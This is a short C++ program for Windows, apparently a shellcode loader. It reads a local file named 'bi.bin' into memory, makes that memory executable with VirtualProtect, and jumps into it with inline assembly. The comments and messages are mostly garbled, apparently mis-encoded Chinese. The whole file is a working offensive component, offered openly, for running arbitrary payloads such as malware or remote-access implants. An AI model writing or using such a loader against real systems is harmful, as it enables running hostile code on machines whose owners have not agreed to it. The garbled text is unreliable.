#include <Windows.h>
#include <iostream>

using namespace std;

int main()
{
    LPCSTR ShellcodeFile = "bi.bin";//�����ص�Shellcode�ļ�

    // ���ļ�
    HANDLE hFile = CreateFileA(ShellcodeFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        cout << "���ļ�ʧ��!" << endl;
        return 1;
    }

    // ��ȡ�ļ���С
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE)
    {
        CloseHandle(hFile);
        cout << "�޷���ȡ�ļ���С Ҳ��ռ����?" << endl;
        return 1;
    }

    // ��ȡ�ļ�����
    LPVOID lpFileContent = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwBytesRead = 0;
    BOOL bResult = ReadFile(hFile, lpFileContent, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hFile);
    if (!bResult || dwBytesRead != dwFileSize)
    {
        VirtualFree(lpFileContent, 0, MEM_RELEASE);
        cout << "���ļ�ʧ��!" << endl;
        return 1;
    }

    DWORD dwOldProtect;
    VirtualProtect(lpFileContent, dwFileSize, PAGE_EXECUTE_READ, &dwOldProtect);

    // ִ��Shellcode
    __asm
    {
        mov eax, lpFileContent
        call eax
    }

    VirtualFree(lpFileContent, 0, MEM_RELEASE);
    return 0;
}